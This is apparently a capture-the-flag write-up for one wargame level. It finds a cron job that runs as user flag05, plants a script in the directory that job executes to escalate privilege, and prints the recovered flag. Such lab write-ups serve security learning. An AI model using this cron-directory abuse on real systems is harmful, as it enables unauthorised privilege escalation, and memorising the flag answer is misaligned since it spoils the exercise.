When connecting we get this message : 'You have new mail.'

```bash
> find / -name "*mail*" 2>/dev/null
/var/mail

> cd /var/mail
> ls
level05

> cat level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

sh /usr/sbin/openarenaserver is executed every 2 minutes as the user flag05.

Let's take a look to the script:
```bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

\- This script is iterating all the files in /opt/openarenaserver and executes them with the bash command.

\- Let's add a file in /opt/openarenaserver:

```bash
> cd /opt/openarenaserver
> echo "#!/bin/bash" > solve.sh
> echo "getflag > /tmp/flag" >> solve.sh
> chmod 777 solve.sh

Now we wait until the cronjob run the script.

> cat /tmp/flag
viuaaale9huek52boumoomioc
```

*viuaaale9huek52boumoomioc*
